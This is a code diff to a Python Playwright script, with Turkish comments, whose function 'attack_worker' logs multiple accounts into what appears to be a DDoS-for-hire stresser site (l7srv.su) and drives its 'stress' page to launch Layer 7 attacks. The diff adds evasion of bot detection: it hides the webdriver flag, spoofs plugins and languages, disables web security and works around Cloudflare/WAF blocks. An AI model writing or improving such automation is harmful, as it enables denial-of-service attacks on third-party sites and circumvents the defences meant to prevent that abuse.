@@ -51,52 +51,75 @@ def attack_worker(account):
     while True:
         try:
             with sync_playwright() as p:
+                # Daha gerçekçi tarayıcı ayarları
                 context = p.chromium.launch_persistent_context(
                     user_data_dir=profile_dir,
                     headless=True,
-                    viewport={"width": 1280, "height": 720},
-                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+                    viewport={"width": 1920, "height": 1080},
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    args=[
+                        "--no-sandbox",
+                        "--disable-dev-shm-usage",
+                        "--disable-gpu",
+                        "--disable-blink-features=AutomationControlled",
+                        "--disable-features=IsolateOrigins,site-per-process",
+                        "--disable-web-security",
+                        "--disable-features=BlockInsecurePrivateNetworkRequests",
+                        "--disable-features=OutOfBlinkCors"
+                    ],
                     slow_mo=100
                 )
                 page = context.new_page()
+
+                # WebDriver tespitini gizle
                 page.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                    Object.defineProperty(navigator, 'webdriver', {
+                        get: () => undefined
+                    });
+                    Object.defineProperty(navigator, 'plugins', {
+                        get: () => [1, 2, 3, 4, 5]
+                    });
+                    Object.defineProperty(navigator, 'languages', {
+                        get: () => ['en-US', 'en']
+                    });
                 """)
 
-                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
+                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor (URL: https://l7srv.su/login)...")
                 try:
-                    # 1. Sayfayı yükle, networkidle ile tüm JS yüklenene kadar bekle
-                    response = page.goto("https://l7srv.su/login", timeout=30000, wait_until="networkidle")
+                    response = page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
                     if response:
                         print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
                         if response.status >= 400:
                             print(f"[{username}] ⚠️ HTTP hatası: {response.status} - Sayfa mevcut değil veya erişim engeli.")
+                            if response.status == 403:
+                                print(f"[{username}] 🛑 403 Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir. Headless modda bot algılaması yapılıyor.")
                             raise Exception(f"HTTP {response.status}")
                     else:
                         print(f"[{username}] ❌ Yanıt alınamadı (response None).")
                         raise Exception("No response")
-                    
-                    # 2. #username alanının gelmesini bekle (dinamik JS ile ekleniyorsa)
-                    try:
-                        page.wait_for_selector("#username", timeout=15000)
-                        print(f"[{username}] ✅ #username alanı mevcut.")
-                    except Exception as sel_err:
-                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir. Hata: {sel_err}")
-                        raise sel_err
 
-                    # 3. Formu doldur
+                    # DOM'un yüklenmesini bekle
+                    page.wait_for_load_state("domcontentloaded", timeout=15000)
+                    time.sleep(2)
+
+                    # Form alanlarını kontrol et
+                    if page.locator("#username").count() == 0:
+                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir.")
+                    else:
+                        print(f"[{username}] ✅ #username alanı mevcut.")
+
+                    # Formu doldur
                     print(f"[{username}] 📝 Form dolduruluyor...")
                     page.fill("#username", username)
                     page.fill("#password", password)
 
-                    # 4. Buton aktifleşene kadar bekle
+                    # Buton aktifleşene kadar bekle
                     print(f"[{username}] ⏳ Buton aktifleşmesi bekleniyor...")
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                     page.click("#loginNextBtn")
                     print(f"[{username}] 🖱️ Butona tıklandı.")
 
-                    # 5. Dashboard'a yönlenene kadar bekle
+                    # Dashboard'a yönlenene kadar bekle (timeout 60 sn)
                     page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                     print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                     consecutive_errors = 0
@@ -126,10 +149,10 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    response = page.goto("https://l7srv.su/dash/stress", timeout=30000, wait_until="networkidle")
+                    response = page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
                     if response:
                         print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
-                    page.wait_for_load_state("networkidle", timeout=10000)
+                    page.wait_for_load_state("domcontentloaded", timeout=15000)
                     time.sleep(2)
                     if page.locator("#layer_7").count() == 0:
                         print(f"[{username}] ⚠️ #layer_7 bulunamadı, belki farklı bir sekme?")
@@ -171,7 +194,7 @@ def attack_worker(account):
                             time.sleep(2)
 
                         page.reload()
-                        page.wait_for_load_state("networkidle", timeout=30000)
+                        page.wait_for_load_state("domcontentloaded", timeout=30000)
                         time.sleep(2)
                         page.locator("#layer_7").click()
                         time.sleep(1)
